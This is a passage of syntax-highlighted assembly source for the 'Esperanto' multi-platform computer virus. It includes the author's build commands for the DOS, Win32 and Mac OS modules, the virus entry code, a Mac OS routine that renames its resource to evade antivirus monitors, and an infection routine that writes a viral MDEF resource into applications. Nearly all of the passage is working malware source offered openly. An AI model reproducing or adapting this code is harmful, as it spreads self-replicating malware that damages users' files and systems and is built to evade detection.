</span><span class="sc1">; Btw, Guillermito... what about your "virus of the year" contest? ;)</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; 6. Compiling it</span><span class="sc0">
</span><span class="sc1">; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">
</span><span class="sc1">; Don't even think on trying to compile the source code below. To do it, you</span><span class="sc0">
</span><span class="sc1">; should first separate three of the four modules, compile each of them with</span><span class="sc0">
</span><span class="sc1">; a different mode and/or compiler, and then put again the whole stuff toge-</span><span class="sc0">
</span><span class="sc1">; ther into one only file, keeping the data area untouched and having to mo-</span><span class="sc0">
</span><span class="sc1">; dify *every* pointer to it in the viral code.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; Better to use the already compiled binary provided by us, right? :) Anyway</span><span class="sc0">
</span><span class="sc1">; these are the compiling modes, for those of you who are curious about what</span><span class="sc0">
</span><span class="sc1">; did i use for compiling Esperanto. Btw, the compiler for the Mac OS module</span><span class="sc0">
</span><span class="sc1">; was CodeWarrior (i had to insert the ASM code inside a C source).</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;  DOS+Windows 3.1x modules</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; tasm /m espodos.asm</span><span class="sc0">
</span><span class="sc1">; tlink espodos.obj</span><span class="sc0">
</span><span class="sc1">; exe2bin espodos.exe espodos.com</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;  Win32 module</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; tasm32 -ml -m5 -q -zn espow32.asm</span><span class="sc0">
</span><span class="sc1">; tlink32 -Tpe -c -x -aa espow32.obj,,, import32.lib</span><span class="sc0">
</span><span class="sc1">; pewrsec espow32.exe</span><span class="sc0">


                </span><span class="sc9">.model</span><span class="sc0">  </span><span class="sc10">tiny</span><span class="sc0">
                </span><span class="sc9">.code</span><span class="sc0">
                 </span><span class="sc9">org</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">

</span><span class="sc1">; ÍÍ¹ Absolute virus start ÌÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ</span><span class="sc0">

                </span><span class="sc2">.386</span><span class="sc0">                                </span><span class="sc1">; Intel 80386 real mode</span><span class="sc0">
</span><span class="sc5">espo_start</span><span class="sc0">      </span><span class="sc9">label</span><span class="sc0">   </span><span class="sc10">byte</span><span class="sc0">                        </span><span class="sc1">; Define virus start</span><span class="sc0">
</span><span class="sc5">espo_mem_size</span><span class="sc0">   </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc5">espo_mem_end</span><span class="sc4">-</span><span class="sc5">espo_start</span><span class="sc0">     </span><span class="sc1">; Define size in memory</span><span class="sc0">
</span><span class="sc5">espo_file_size</span><span class="sc0">  </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc5">espo_file_end</span><span class="sc4">-</span><span class="sc5">espo_start</span><span class="sc0">    </span><span class="sc1">; Define size in file</span><span class="sc0">
</span><span class="sc5">reloc_size</span><span class="sc0">      </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc5">reloc_end</span><span class="sc4">-</span><span class="sc5">reloc_start</span><span class="sc0">       </span><span class="sc1">; Relocation size (NE)</span><span class="sc0">
</span><span class="sc5">dseta_offset</span><span class="sc0">    </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc5">dseta_byte</span><span class="sc4">-</span><span class="sc5">espow32_start</span><span class="sc0">    </span><span class="sc1">; Dseta-offset size</span><span class="sc0">
</span><span class="sc5">text_size</span><span class="sc0">       </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc5">text_end</span><span class="sc4">-</span><span class="sc5">text_start</span><span class="sc0">         </span><span class="sc1">; Size of payload text</span><span class="sc0">
</span><span class="sc5">base_default</span><span class="sc0">    </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">400000h</span><span class="sc0">                     </span><span class="sc1">; Base default address</span><span class="sc0">

</span><span class="sc1">; ÄÄ´ Universal entry ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;  Note: this is the entry point for infected COM, EXE and Mac OS files. If</span><span class="sc0">
</span><span class="sc1">;   the following instruction is executed in an Intel processor, it will jmp</span><span class="sc0">
</span><span class="sc1">;   to the real entry for COM and EXE files. Otherwise (when running under a</span><span class="sc0">
</span><span class="sc1">;   Motorola or PowerPC processor) it will be interpreted and executed as if</span><span class="sc0">
</span><span class="sc1">;   it were plain data, thus being able to reach the real entry for infected</span><span class="sc0">
</span><span class="sc1">;   Mac OS applications, which starts with a branch to the definitive entry.</span><span class="sc0">

</span><span class="sc5">com_exe_entry</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">real_ce_entry</span><span class="sc0">               </span><span class="sc1">; Jumps only in PCs</span><span class="sc0">

</span><span class="sc1">; ÍÍ¹ Mac OS module ÌÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ</span><span class="sc0">

</span><span class="sc5">espo_header</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc5">bra.s</span><span class="sc0">   </span><span class="sc5">mac_os_entry</span><span class="sc0">                </span><span class="sc1">; Jump to virus code</span><span class="sc0">
                </span><span class="sc5">dc.w</span><span class="sc0">    #</span><span class="sc5">$0</span><span class="sc0">                         </span><span class="sc1">; Header gaps for later</span><span class="sc0">
                </span><span class="sc5">dc.l</span><span class="sc0">    #</span><span class="sc12">'MDEF'</span><span class="sc0">                     </span><span class="sc1">; initialization in the</span><span class="sc0">
                </span><span class="sc5">dc.l</span><span class="sc0">    #</span><span class="sc5">$0</span><span class="sc0">                         </span><span class="sc1">; jump table built by</span><span class="sc0">
                </span><span class="sc5">dc.l</span><span class="sc0">    #</span><span class="sc5">$0</span><span class="sc0">                         </span><span class="sc1">; the Mac OS Finder</span><span class="sc0">

</span><span class="sc1">; ÄÄ´ Entry point for Mac OS applications ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">

</span><span class="sc5">mac_os_entry</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc5">espo_header</span><span class="sc4">,</span><span class="sc5">a0</span><span class="sc0">              </span><span class="sc1">; Copy our code location</span><span class="sc0">
                </span><span class="sc5">move.l</span><span class="sc0">  </span><span class="sc5">a0</span><span class="sc4">,</span><span class="sc5">$9ce</span><span class="sc0">                     </span><span class="sc1">; to $9ce (ToolScratch)</span><span class="sc0">
                </span><span class="sc5">bra</span><span class="sc0">     </span><span class="sc5">espo_body</span><span class="sc0">                   </span><span class="sc1">; for later reference</span><span class="sc0">

</span><span class="sc5">espo_body</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc5">link</span><span class="sc0">    </span><span class="sc5">a6</span><span class="sc4">,</span><span class="sc0">#</span><span class="sc4">-</span><span class="sc5">$24</span><span class="sc0">                    </span><span class="sc1">; Link code address</span><span class="sc0">
                </span><span class="sc5">movem.l</span><span class="sc0"> </span><span class="sc5">d4</span><span class="sc4">-</span><span class="sc5">d7</span><span class="sc4">/</span><span class="sc5">a2</span><span class="sc4">-</span><span class="sc5">a4</span><span class="sc4">,-(</span><span class="sc8">sp</span><span class="sc4">)</span><span class="sc0">           </span><span class="sc1">; Push in our registers</span><span class="sc0">
                </span><span class="sc5">move.l</span><span class="sc0">  </span><span class="sc5">$14</span><span class="sc4">(</span><span class="sc5">a6</span><span class="sc4">),</span><span class="sc5">d5</span><span class="sc0">                  </span><span class="sc1">; Use d5 as ëelta-offset</span><span class="sc0">

                </span><span class="sc5">movea.l</span><span class="sc0"> #</span><span class="sc5">$a25</span><span class="sc4">,</span><span class="sc5">a3</span><span class="sc0">                    </span><span class="sc1">; In $a25 (MenuFlash),</span><span class="sc0">
                </span><span class="sc5">move.b</span><span class="sc0">  </span><span class="sc4">(</span><span class="sc5">a3</span><span class="sc4">),</span><span class="sc5">d0</span><span class="sc0">                     </span><span class="sc1">; look for our action</span><span class="sc0">
                </span><span class="sc5">ext.w</span><span class="sc0">   </span><span class="sc5">d0</span><span class="sc0">                          </span><span class="sc1">; code (3) in order to</span><span class="sc0">
                </span><span class="sc5">subq.w</span><span class="sc0">  #</span><span class="sc5">$3</span><span class="sc4">,</span><span class="sc5">d0</span><span class="sc0">                      </span><span class="sc1">; know if our code is</span><span class="sc0">
                </span><span class="sc5">beq</span><span class="sc0">     </span><span class="sc5">infect_mac_os</span><span class="sc0">               </span><span class="sc1">; already active or not</span><span class="sc0">

                </span><span class="sc5">move.b</span><span class="sc0">  #</span><span class="sc5">$3</span><span class="sc4">,(</span><span class="sc5">a3</span><span class="sc4">)</span><span class="sc0">                    </span><span class="sc1">; Else switch the flag</span><span class="sc0">
                </span><span class="sc5">clr.w</span><span class="sc0">   </span><span class="sc5">d7</span><span class="sc0">                          </span><span class="sc1">; on as we're going to</span><span class="sc0">
                </span><span class="sc5">moveq</span><span class="sc0">   #</span><span class="sc5">$2</span><span class="sc4">,</span><span class="sc5">d6</span><span class="sc0">                      </span><span class="sc1">; run or handling code</span><span class="sc0">
</span><span class="sc5">check_offset</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc5">tst.w</span><span class="sc0">   </span><span class="sc5">d7</span><span class="sc0">                          </span><span class="sc1">; Look for our resident</span><span class="sc0">
                </span><span class="sc5">bne</span><span class="sc0">     </span><span class="sc5">search_loop</span><span class="sc0">                 </span><span class="sc1">; code thru the memory</span><span class="sc0">

                </span><span class="sc5">movea.l</span><span class="sc0"> </span><span class="sc5">d6</span><span class="sc4">,</span><span class="sc5">a3</span><span class="sc0">                       </span><span class="sc1">; Code apparently found</span><span class="sc0">
                </span><span class="sc5">move.b</span><span class="sc0">  </span><span class="sc4">(</span><span class="sc5">a3</span><span class="sc4">),</span><span class="sc5">d0</span><span class="sc0">                     </span><span class="sc1">; Now check for our</span><span class="sc0">
                </span><span class="sc5">ext.w</span><span class="sc0">   </span><span class="sc5">d0</span><span class="sc0">                          </span><span class="sc1">; header and identifiers</span><span class="sc0">
                </span><span class="sc5">cmpi.w</span><span class="sc0">  #</span><span class="sc12">'M'</span><span class="sc4">,</span><span class="sc5">d0</span><span class="sc0">                     </span><span class="sc1">; Is it an 'M'?</span><span class="sc0">
                </span><span class="sc5">bne.s</span><span class="sc0">   </span><span class="sc5">search_loop</span><span class="sc0">                 </span><span class="sc1">; Keep on searching</span><span class="sc0">

                </span><span class="sc5">move.l</span><span class="sc0">  </span><span class="sc5">a3</span><span class="sc4">,</span><span class="sc5">d0</span><span class="sc0">                       </span><span class="sc1">; First byte is an 'M'</span><span class="sc0">
                </span><span class="sc5">addq.l</span><span class="sc0">  #</span><span class="sc5">$1</span><span class="sc4">,</span><span class="sc5">d0</span><span class="sc0">                      </span><span class="sc1">; Now check the 2nd one</span><span class="sc0">
                </span><span class="sc5">movea.l</span><span class="sc0"> </span><span class="sc5">d0</span><span class="sc4">,</span><span class="sc5">a0</span><span class="sc0">                       </span><span class="sc1">; Move address+1 to a0</span><span class="sc0">
                </span><span class="sc5">move.b</span><span class="sc0">  </span><span class="sc4">(</span><span class="sc5">a0</span><span class="sc4">),</span><span class="sc5">d0</span><span class="sc0">                     </span><span class="sc1">; Move second byte to d0</span><span class="sc0">
                </span><span class="sc5">ext.w</span><span class="sc0">   </span><span class="sc5">d0</span><span class="sc0">                          </span><span class="sc1">; Extend d0</span><span class="sc0">
                </span><span class="sc5">cmpi.w</span><span class="sc0">  #</span><span class="sc12">'D'</span><span class="sc4">,</span><span class="sc5">d0</span><span class="sc0">                     </span><span class="sc1">; Is it a 'D'?</span><span class="sc0">
                </span><span class="sc5">bne.s</span><span class="sc0">   </span><span class="sc5">search_loop</span><span class="sc0">                 </span><span class="sc1">; Keep on searching</span><span class="sc0">

                </span><span class="sc5">move.l</span><span class="sc0">  </span><span class="sc5">a3</span><span class="sc4">,</span><span class="sc5">d0</span><span class="sc0">                       </span><span class="sc1">; Base address to d0</span><span class="sc0">
                </span><span class="sc5">addq.l</span><span class="sc0">  #</span><span class="sc5">$2</span><span class="sc4">,</span><span class="sc5">d0</span><span class="sc0">                      </span><span class="sc1">; Checking 3rd byte...</span><span class="sc0">
                </span><span class="sc5">movea.l</span><span class="sc0"> </span><span class="sc5">d0</span><span class="sc4">,</span><span class="sc5">a0</span><span class="sc0">                       </span><span class="sc1">; Move the address to a0</span><span class="sc0">
                </span><span class="sc5">move.b</span><span class="sc0">  </span><span class="sc4">(</span><span class="sc5">a0</span><span class="sc4">),</span><span class="sc5">d0</span><span class="sc0">                     </span><span class="sc1">; Move the byte to d0</span><span class="sc0">
                </span><span class="sc5">ext.w</span><span class="sc0">   </span><span class="sc5">d0</span><span class="sc0">                          </span><span class="sc1">; Extend d0</span><span class="sc0">
                </span><span class="sc5">cmpi.w</span><span class="sc0">  #</span><span class="sc12">'E'</span><span class="sc4">,</span><span class="sc5">d0</span><span class="sc0">                     </span><span class="sc1">; Is it an 'E'?</span><span class="sc0">
                </span><span class="sc5">bne.s</span><span class="sc0">   </span><span class="sc5">search_loop</span><span class="sc0">                 </span><span class="sc1">; Keep on searching</span><span class="sc0">

                </span><span class="sc5">move.l</span><span class="sc0">  </span><span class="sc5">a3</span><span class="sc4">,</span><span class="sc5">d0</span><span class="sc0">                       </span><span class="sc1">; Base address to d0</span><span class="sc0">
                </span><span class="sc5">addq.l</span><span class="sc0">  #</span><span class="sc5">$3</span><span class="sc4">,</span><span class="sc5">d0</span><span class="sc0">                      </span><span class="sc1">; Let's check 4th byte</span><span class="sc0">
                </span><span class="sc5">movea.l</span><span class="sc0"> </span><span class="sc5">d0</span><span class="sc4">,</span><span class="sc5">a0</span><span class="sc0">                       </span><span class="sc1">; Move its address to a0</span><span class="sc0">
                </span><span class="sc5">move.b</span><span class="sc0">  </span><span class="sc4">(</span><span class="sc5">a0</span><span class="sc4">),</span><span class="sc5">d0</span><span class="sc0">                     </span><span class="sc1">; Move 4th byte to d0</span><span class="sc0">
                </span><span class="sc5">ext.w</span><span class="sc0">   </span><span class="sc5">d0</span><span class="sc0">                          </span><span class="sc1">; Extend d0</span><span class="sc0">
                </span><span class="sc5">cmpi.w</span><span class="sc0">  #</span><span class="sc12">'F'</span><span class="sc4">,</span><span class="sc5">d0</span><span class="sc0">                     </span><span class="sc1">; Is it an 'F'?</span><span class="sc0">
                </span><span class="sc5">bne.s</span><span class="sc0">   </span><span class="sc5">search_loop</span><span class="sc0">                 </span><span class="sc1">; Keep on searching</span><span class="sc0">

                </span><span class="sc5">move.l</span><span class="sc0">  </span><span class="sc5">a3</span><span class="sc4">,</span><span class="sc5">d0</span><span class="sc0">                       </span><span class="sc1">; Restore address in d0</span><span class="sc0">
                </span><span class="sc5">addq.l</span><span class="sc0">  #</span><span class="sc5">$4</span><span class="sc4">,</span><span class="sc5">d0</span><span class="sc0">                      </span><span class="sc1">; d0+$4=5th byte to see</span><span class="sc0">
                </span><span class="sc5">movea.l</span><span class="sc0"> </span><span class="sc5">d0</span><span class="sc4">,</span><span class="sc5">a0</span><span class="sc0">                       </span><span class="sc1">; Move its address to a0</span><span class="sc0">
                </span><span class="sc5">move.b</span><span class="sc0">  </span><span class="sc4">(</span><span class="sc5">a0</span><span class="sc4">),</span><span class="sc5">d0</span><span class="sc0">                     </span><span class="sc1">; Move 5th byte to d0</span><span class="sc0">
                </span><span class="sc5">ext.w</span><span class="sc0">   </span><span class="sc5">d0</span><span class="sc0">                          </span><span class="sc1">; Extend d0</span><span class="sc0">
                </span><span class="sc5">cmpi.w</span><span class="sc0">  #</span><span class="sc5">$67</span><span class="sc4">,</span><span class="sc5">d0</span><span class="sc0">                     </span><span class="sc1">; Check for Esperanto</span><span class="sc0">
                </span><span class="sc5">bne.s</span><span class="sc0">   </span><span class="sc5">search_loop</span><span class="sc0">                 </span><span class="sc1">; resource first ID</span><span class="sc0">

                </span><span class="sc5">move.l</span><span class="sc0">  </span><span class="sc5">a3</span><span class="sc4">,</span><span class="sc5">d0</span><span class="sc0">                       </span><span class="sc1">; Base address in d0</span><span class="sc0">
                </span><span class="sc5">addq.l</span><span class="sc0">  #</span><span class="sc5">$5</span><span class="sc4">,</span><span class="sc5">d0</span><span class="sc0">                      </span><span class="sc1">; Checking 6th byte</span><span class="sc0">
                </span><span class="sc5">movea.l</span><span class="sc0"> </span><span class="sc5">d0</span><span class="sc4">,</span><span class="sc5">a0</span><span class="sc0">                       </span><span class="sc1">; Move its address to a0</span><span class="sc0">
                </span><span class="sc5">move.b</span><span class="sc0">  </span><span class="sc4">(</span><span class="sc5">a0</span><span class="sc4">),</span><span class="sc5">d0</span><span class="sc0">                     </span><span class="sc1">; Move the byte to d0</span><span class="sc0">
                </span><span class="sc5">ext.w</span><span class="sc0">   </span><span class="sc5">d0</span><span class="sc0">                          </span><span class="sc1">; Extend d0</span><span class="sc0">
                </span><span class="sc5">cmpi.w</span><span class="sc0">  #</span><span class="sc5">$26</span><span class="sc4">,</span><span class="sc5">d0</span><span class="sc0">                     </span><span class="sc1">; Check for the 2nd ID</span><span class="sc0">
                </span><span class="sc5">bne.s</span><span class="sc0">   </span><span class="sc5">search_loop</span><span class="sc0">                 </span><span class="sc1">; Wrong ID, search again</span><span class="sc0">

                </span><span class="sc5">move.l</span><span class="sc0">  </span><span class="sc5">a3</span><span class="sc4">,</span><span class="sc5">d0</span><span class="sc0">                       </span><span class="sc1">; Get the address for</span><span class="sc0">
                </span><span class="sc5">addq.l</span><span class="sc0">  #</span><span class="sc5">$6</span><span class="sc4">,</span><span class="sc5">d0</span><span class="sc0">                      </span><span class="sc1">; the 7th and last byte,</span><span class="sc0">
                </span><span class="sc5">movea.l</span><span class="sc0"> </span><span class="sc5">d0</span><span class="sc4">,</span><span class="sc5">a0</span><span class="sc0">                       </span><span class="sc1">; which has to be our</span><span class="sc0">
                </span><span class="sc5">move.b</span><span class="sc0">  </span><span class="sc4">(</span><span class="sc5">a0</span><span class="sc4">),</span><span class="sc5">d0</span><span class="sc0">                     </span><span class="sc1">; 3rd resource ID ($0c)</span><span class="sc0">
                </span><span class="sc5">ext.w</span><span class="sc0">   </span><span class="sc5">d0</span><span class="sc0">                          </span><span class="sc1">; Extend d0</span><span class="sc0">
                </span><span class="sc5">cmpi.w</span><span class="sc0">  #</span><span class="sc5">$0c</span><span class="sc4">,</span><span class="sc5">d0</span><span class="sc0">                     </span><span class="sc1">; Everything ok?</span><span class="sc0">
                </span><span class="sc5">bne.s</span><span class="sc0">   </span><span class="sc5">search_loop</span><span class="sc0">                 </span><span class="sc1">; Wrong, how bad luck :(</span><span class="sc0">

                </span><span class="sc5">move.b</span><span class="sc0">  #</span><span class="sc12">'W'</span><span class="sc4">,(</span><span class="sc5">a3</span><span class="sc4">)</span><span class="sc0">                   </span><span class="sc1">; Change MDEF to WDEF to</span><span class="sc0">
                </span><span class="sc5">moveq</span><span class="sc0">   #</span><span class="sc5">$1</span><span class="sc4">,</span><span class="sc5">d7</span><span class="sc0">                      </span><span class="sc1">; fool some AV watchdogs</span><span class="sc0">
</span><span class="sc5">search_loop</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc5">addq.l</span><span class="sc0">  #</span><span class="sc5">$1</span><span class="sc4">,</span><span class="sc5">d6</span><span class="sc0">                      </span><span class="sc1">; and to limit too fast</span><span class="sc0">
                </span><span class="sc5">cmpi.l</span><span class="sc0">  #</span><span class="sc5">$30d40</span><span class="sc4">,</span><span class="sc5">d6</span><span class="sc0">                  </span><span class="sc1">; infection, as WDEF is</span><span class="sc0">
                </span><span class="sc5">ble</span><span class="sc0">     </span><span class="sc5">check_offset</span><span class="sc0">                </span><span class="sc1">; a less called resource</span><span class="sc0">

</span><span class="sc1">; ÄÄ´ Mac OS applications infection routine ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">

</span><span class="sc5">infect_mac_os</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc5">subq.w</span><span class="sc0">  #</span><span class="sc5">$4</span><span class="sc4">,</span><span class="sc8">sp</span><span class="sc0">                      </span><span class="sc1">; Empty stack (4 bytes)</span><span class="sc0">
                </span><span class="sc5">move.l</span><span class="sc0">  #</span><span class="sc12">'CODE'</span><span class="sc4">,-(</span><span class="sc8">sp</span><span class="sc4">)</span><span class="sc0">               </span><span class="sc1">; Push the resource name</span><span class="sc0">
                </span><span class="sc5">clr.w</span><span class="sc0">   </span><span class="sc4">-(</span><span class="sc8">sp</span><span class="sc4">)</span><span class="sc0">                       </span><span class="sc1">; we're looking for and</span><span class="sc0">
                </span><span class="sc5">_GetResource</span><span class="sc0">                        </span><span class="sc1">; clear the stack</span><span class="sc0">

                </span><span class="sc5">movea.l</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc8">sp</span><span class="sc4">)+,</span><span class="sc5">a4</span><span class="sc0">                    </span><span class="sc1">; Move address to a4</span><span class="sc0">
                </span><span class="sc5">subq.w</span><span class="sc0">  #</span><span class="sc5">$2</span><span class="sc4">,</span><span class="sc8">sp</span><span class="sc0">                      </span><span class="sc1">; Empty stack (2 bytes)</span><span class="sc0">
                </span><span class="sc5">move.l</span><span class="sc0">  </span><span class="sc5">a4</span><span class="sc4">,-(</span><span class="sc8">sp</span><span class="sc4">)</span><span class="sc0">                    </span><span class="sc1">; Push 'CODE' address</span><span class="sc0">
                </span><span class="sc5">_HomeResFile</span><span class="sc0">                        </span><span class="sc1">; Home resource file</span><span class="sc0">

                </span><span class="sc5">move.w</span><span class="sc0">  </span><span class="sc4">(</span><span class="sc8">sp</span><span class="sc4">)+,</span><span class="sc5">d4</span><span class="sc0">                    </span><span class="sc1">; Move address to d4</span><span class="sc0">
                </span><span class="sc5">subq.w</span><span class="sc0">  #</span><span class="sc5">$2</span><span class="sc4">,</span><span class="sc8">sp</span><span class="sc0">                      </span><span class="sc1">; Empty stack (2 bytes)</span><span class="sc0">
                </span><span class="sc5">_CurResFile</span><span class="sc0">                         </span><span class="sc1">; Current resource file</span><span class="sc0">

                </span><span class="sc5">move.w</span><span class="sc0">  </span><span class="sc4">(</span><span class="sc8">sp</span><span class="sc4">)+,</span><span class="sc5">d7</span><span class="sc0">                    </span><span class="sc1">; Move address to d7</span><span class="sc0">
                </span><span class="sc5">subq.w</span><span class="sc0">  #</span><span class="sc5">$4</span><span class="sc4">,</span><span class="sc8">sp</span><span class="sc0">                      </span><span class="sc1">; Empty stack (4 bytes)</span><span class="sc0">
                </span><span class="sc5">move.l</span><span class="sc0">  #</span><span class="sc12">'MDEF'</span><span class="sc4">,-(</span><span class="sc8">sp</span><span class="sc4">)</span><span class="sc0">               </span><span class="sc1">; Move the resource name</span><span class="sc0">
                </span><span class="sc5">move.w</span><span class="sc0">  #</span><span class="sc5">$espo_file_size</span><span class="sc4">,-(</span><span class="sc8">sp</span><span class="sc4">)</span><span class="sc0">      </span><span class="sc1">; we're looking for</span><span class="sc0">
                </span><span class="sc5">_GetResource</span><span class="sc0">                        </span><span class="sc1">; (Try to) get it</span><span class="sc0">

                </span><span class="sc5">movea.l</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc8">sp</span><span class="sc4">)+,</span><span class="sc5">a4</span><span class="sc0">                    </span><span class="sc1">; Move address to a4</span><span class="sc0">
                </span><span class="sc5">move.l</span><span class="sc0">  </span><span class="sc5">a4</span><span class="sc4">,</span><span class="sc5">d0</span><span class="sc0">                       </span><span class="sc1">; Does it exist?</span><span class="sc0">
                </span><span class="sc5">bne.s</span><span class="sc0">   </span><span class="sc5">new_mdef</span><span class="sc0">                    </span><span class="sc1">; Go and create it</span><span class="sc0">

                </span><span class="sc5">subq.w</span><span class="sc0">  #</span><span class="sc5">$4</span><span class="sc4">,</span><span class="sc8">sp</span><span class="sc0">                      </span><span class="sc1">; Empty stack (4 bytes)</span><span class="sc0">
                </span><span class="sc5">move.l</span><span class="sc0">  #</span><span class="sc12">'MDEF'</span><span class="sc4">,-(</span><span class="sc8">sp</span><span class="sc4">)</span><span class="sc0">               </span><span class="sc1">; Move resource name</span><span class="sc0">
                </span><span class="sc5">pea</span><span class="sc0">     </span><span class="sc5">first_tab</span><span class="sc0">                   </span><span class="sc1">; Move identifier</span><span class="sc0">
                </span><span class="sc5">_GetNamedResource</span><span class="sc0">                   </span><span class="sc1">; Get MDEF address</span><span class="sc0">

                </span><span class="sc5">movea.l</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc8">sp</span><span class="sc4">)+,</span><span class="sc5">a2</span><span class="sc0">                    </span><span class="sc1">; Move its address to a2</span><span class="sc0">
                </span><span class="sc5">move.l</span><span class="sc0">  </span><span class="sc5">a2</span><span class="sc4">,-(</span><span class="sc8">sp</span><span class="sc4">)</span><span class="sc0">                    </span><span class="sc1">; Push it onto the stack</span><span class="sc0">
                </span><span class="sc5">_DetachResource</span><span class="sc0">                     </span><span class="sc1">; Detach resource</span><span class="sc0">

                </span><span class="sc5">clr.w</span><span class="sc0">   </span><span class="sc4">-(</span><span class="sc8">sp</span><span class="sc4">)</span><span class="sc0">                       </span><span class="sc1">; Clear the stack</span><span class="sc0">
                </span><span class="sc5">_UseResFile</span><span class="sc0">                         </span><span class="sc1">; Use the MDEF resource</span><span class="sc0">

                </span><span class="sc5">subq.w</span><span class="sc0">  #</span><span class="sc5">$4</span><span class="sc4">,</span><span class="sc8">sp</span><span class="sc0">                      </span><span class="sc1">; Empty stack (4 bytes)</span><span class="sc0">
                </span><span class="sc5">move.l</span><span class="sc0">  #</span><span class="sc12">'MDEF'</span><span class="sc4">,-(</span><span class="sc8">sp</span><span class="sc4">)</span><span class="sc0">               </span><span class="sc1">; Move the resource name</span><span class="sc0">
                </span><span class="sc5">clr.w</span><span class="sc0">   </span><span class="sc4">-(</span><span class="sc8">sp</span><span class="sc4">)</span><span class="sc0">                       </span><span class="sc1">; Clear one word</span><span class="sc0">
                </span><span class="sc5">_GetResource</span><span class="sc0">                        </span><span class="sc1">; Open the MDEF resource</span><span class="sc0">

                </span><span class="sc5">movea.l</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc8">sp</span><span class="sc4">)+,</span><span class="sc5">a4</span><span class="sc0">                    </span><span class="sc1">; Move handle to a4</span><span class="sc0">
                </span><span class="sc5">move.l</span><span class="sc0">  </span><span class="sc5">a4</span><span class="sc4">,-(</span><span class="sc8">sp</span><span class="sc4">)</span><span class="sc0">                    </span><span class="sc1">; Push it into the stack</span><span class="sc0">
                </span><span class="sc5">move.w</span><span class="sc0">  #</span><span class="sc5">$espo_file_size</span><span class="sc4">,-(</span><span class="sc8">sp</span><span class="sc4">)</span><span class="sc0">      </span><span class="sc1">; Move our identifier</span><span class="sc0">
                </span><span class="sc5">pea</span><span class="sc0">     </span><span class="sc5">name_only</span><span class="sc0">                   </span><span class="sc1">; And push the name tab</span><span class="sc0">
                </span><span class="sc5">_SetResInfo</span><span class="sc0">                         </span><span class="sc1">; Set resource new info</span><span class="sc0">

                </span><span class="sc5">move.l</span><span class="sc0">  </span><span class="sc5">a4</span><span class="sc4">,-(</span><span class="sc8">sp</span><span class="sc4">)</span><span class="sc0">                    </span><span class="sc1">; Move handle into stack</span><span class="sc0">
                </span><span class="sc5">_ChangedResource</span><span class="sc0">                    </span><span class="sc1">; Resource has changed</span><span class="sc0">

                </span><span class="sc5">move.l</span><span class="sc0">  </span><span class="sc5">a4</span><span class="sc4">,-(</span><span class="sc8">sp</span><span class="sc4">)</span><span class="sc0">                    </span><span class="sc1">; Move handle into stack</span><span class="sc0">
                </span><span class="sc5">_WriteResource</span><span class="sc0">                      </span><span class="sc1">; Write a new MDEF res.</span><span class="sc0">

                </span><span class="sc5">move.l</span><span class="sc0">  </span><span class="sc5">a2</span><span class="sc4">,-(</span><span class="sc8">sp</span><span class="sc4">)</span><span class="sc0">                    </span><span class="sc1">; Stack original address</span><span class="sc0">
                </span><span class="sc5">move.l</span><span class="sc0">  #</span><span class="sc12">'MDEF'</span><span class="sc4">,-(</span><span class="sc8">sp</span><span class="sc4">)</span><span class="sc0">               </span><span class="sc1">; Stack resource name</span><span class="sc0">
                </span><span class="sc5">clr.w</span><span class="sc0">   </span><span class="sc4">-(</span><span class="sc8">sp</span><span class="sc4">)</span><span class="sc0">                       </span><span class="sc1">; Clear one word</span><span class="sc0">
                </span><span class="sc5">pea</span><span class="sc0">     </span><span class="sc5">second_tab</span><span class="sc0">                  </span><span class="sc1">; Viral res.ID string</span><span class="sc0">
                </span><span class="sc5">_AddResource</span><span class="sc0">                        </span><span class="sc1">; Add new resource</span><span class="sc0">

                </span><span class="sc5">clr.w</span><span class="sc0">   </span><span class="sc4">-(</span><span class="sc8">sp</span><span class="sc4">)</span><span class="sc0">                       </span><span class="sc1">; Clear one word</span><span class="sc0">
                </span><span class="sc5">_UpdateResFile</span><span class="sc0">                      </span><span class="sc1">; Update resource file</span><span class="sc0">

